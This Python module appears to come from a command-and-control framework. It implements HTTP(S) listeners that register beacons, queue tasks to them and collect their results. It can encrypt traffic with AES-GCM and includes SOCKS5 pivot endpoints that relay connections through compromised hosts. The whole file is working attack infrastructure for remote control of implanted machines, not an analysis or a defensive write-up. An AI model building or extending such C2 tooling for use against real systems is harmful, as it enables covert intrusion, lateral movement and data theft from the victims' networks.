"""HTTP(S) C2 listeners and the in-process orchestrator.

Beacon protocol (JSON over HTTP POST):
  Beacon -> Server:  /checkin   {"beacon_id": "...", "meta": {...}, "results":[{...}]}
  Server  -> Beacon: response {"session_id": ..., "interval": ..., "tasks": [], "commands": []}

Transport options:
  * HTTPS: the listener wraps the socket with a TLS context (self-signed cert
    that the beacon must trust, selectable via `--no-verify`/trust store).
  * AES-GCM body encryption: when a `crypto_key` is configured, request bodies
    and responses are wrapped as an AES-GCM envelope instead of raw JSON.
"""
import base64
import hashlib
import json
import os
import socket
import ssl
import threading
import time

from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse

from .store import SessionStore
from .socksrelay import SocksRelay
from .. import crypto

_RELAY = SocksRelay()


def _global_relay():
    return _RELAY


def b64e(b):
    return base64.b64encode(b).decode()


def b64d(s):
    return base64.b64decode(s)


def gen_beacon_id(addr, meta):
    seed = f"{addr}-{meta.get('hostname')}-{meta.get('pid')}-{time.time()}".encode()
    return hashlib.sha1(seed).hexdigest()[:16]


class BeaconHTTPHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    server_version = "cscli-listener/1.0"

    def log_message(self, fmt, *args):
        pass  # quiet logs; console prints status

    def _read_envelope(self, raw):
        srv = self.server.srv
        if srv.gcm is not None:
            try:
                pt = srv.gcm.decrypt(raw)
            except Exception as e:
                return None, f"decrypt failed: {e}"
            try:
                return json.loads(pt.decode()), None
            except Exception as e:
                return None, f"decrypted body bad json: {e}"
        try:
            return json.loads(raw.decode()), None
        except Exception as e:
            return None, f"bad json: {e}"

    def _send_json(self, obj, code=200):
        body = json.dumps(obj).encode()
        if self.server.srv.gcm is not None:
            body = self.server.srv.gcm.encrypt(body)
        self.send_response(code)
        self.send_header("Content-Type", "application/octet-stream"
                         if self.server.srv.gcm else "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Connection", "close")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path == "/ping":
            self._send_json({"status": "ok", "ts": time.time()})
        elif parsed.path == "/health":
            self._send_json({"status": "ok"})
        else:
            self._send_json({"error": "not found"}, 404)

    def do_POST(self):
        parsed = urlparse(self.path)
        length = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(length) if length else b""
        payload, err = self._read_envelope(raw)
        if err:
            self._send_json({"error": err}, 400)
            return

        srv = self.server.srv
        p = parsed.path
        if p in ("/checkin", "/register"):
            self._handle_checkin(payload, srv)
        elif p == "/socks_open":
            self._socks_open(payload, srv)
        elif p == "/socks":
            self._socks_data(payload, srv)
        elif p == "/socks_close":
            self._socks_close(payload, srv)
        else:
            self._send_json({"error": "not found"}, 404)

    # ---- SOCKS5 pivot endpoints ----
    def _socks_open(self, payload, srv):
        conn_id = payload.get("conn_id")
        host = payload.get("host")
        port = payload.get("port")
        ok = srv.relay.open(conn_id, host, port)
        self._send_json({"status": "ok" if ok else "err"})

    def _socks_data(self, payload, srv):
        conn_id = payload.get("conn_id")
        data = payload.get("data")
        ok = srv.relay.client_to_server(conn_id, data)
        self._send_json({"status": "ok" if ok else "err"})

    def _socks_close(self, payload, srv):
        srv.relay.close(payload.get("conn_id"))
        self._send_json({"status": "ok"})

    def _socks_pending(self, srv, sid, payload):
        """Collect buffered server->client bytes for the beacon's SOCKS conns
        and include them in the checkin response. Conn ids are namespaced with
        the beacon session id (sid-<n>)."""
        prefix = sid + "-"
        out = []
        for cid in srv.relay.conn_keys():
            if not cid.startswith(prefix):
                continue
            data = srv.relay.drain(cid)
            if data:
                out.append({"conn_id": cid, "data": b64e(data)})
            elif srv.relay.is_done(cid):
                out.append({"conn_id": cid, "data": "", "eof": True})
        return out or None

    def _handle_checkin(self, payload, srv):
        bid = payload.get("beacon_id")
        meta = payload.get("meta") or {}
        addr = self.client_address[0]
        results = payload.get("results") or []

        sid = srv.on_checkin(bid, meta, addr)
        for r in (results or []):
            if isinstance(r, dict) and r.get("id"):
                srv.store.add_result(sid, r.get("id"), r.get("data"))

        pending = srv.store.pending_tasks(sid)
        resp = {
            "session_id": sid,
            "interval": srv.interval,
            "tasks": pending,
            "commands": srv.command_names(),
        }
        # SOCKS5 pivot: attach buffered server->client bytes for this beacon
        socks = self._socks_pending(srv, sid, payload)
        if socks:
            resp["socks_out"] = socks
        self._send_json(resp)


class Listener:
    """A single HTTP(S) beacon listener on a user-chosen port."""

    def __init__(self, name, host, port, store, on_new_session_cb=None,
                 interval=5, command_names=None, tls=None, crypto_key=None):
        self.name = name
        self.host = host
        self.port = port
        self.store = store
        self.interval = interval
        self._command_names = command_names or []
        self.on_new_session_cb = on_new_session_cb
        self.tls = tls  # dict(cert, key) or {"cert":..., "key":...} or None
        if crypto_key:
            _key = crypto.derive_key(crypto_key)
            self.gcm = crypto.GCMCipher(_key)
        else:
            self.gcm = None
        self.handler = None
        self.httpd = None
        self.thread = None
        self.running = False
        self.scheme = "https" if tls else "http"
        self.relay = getattr(self, "relay", None) or _global_relay()

    @property
    def url(self):
        return f"{self.scheme}://{self.host}:{self.port}"

    def start(self):
        self.handler = BeaconHTTPHandler
        self.httpd = ThreadingHTTPServer((self.host, self.port), self.handler)
        self.httpd.srv = self
        if self.tls:
            cert, key = self.tls["cert"], self.tls.get("key") or self.tls["cert"]
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(cert, key)
            self.httpd.socket = ctx.wrap_socket(self.httpd.socket, server_side=True)
        self.running = True
        self.thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)
        self.thread.start()
        return self

    def stop(self):
        self.running = False
        if self.httpd:
            try:
                self.httpd.shutdown()
            except Exception:
                pass
            self.httpd.server_close()

    def command_names(self):
        return self._command_names

    def on_checkin(self, bid, meta, addr):
        """Returns session id for this beacon, creating/updating as needed."""
        sid = bid
        if sid not in self.store.session_store_keys():
            sess = self.store.new_session(sid, meta, self.name, addr)
            if self.on_new_session_cb:
                try:
                    self.on_new_session_cb(sess)
                except Exception:
                    pass
        else:
            self.store.update_seen(sid)
        return sid
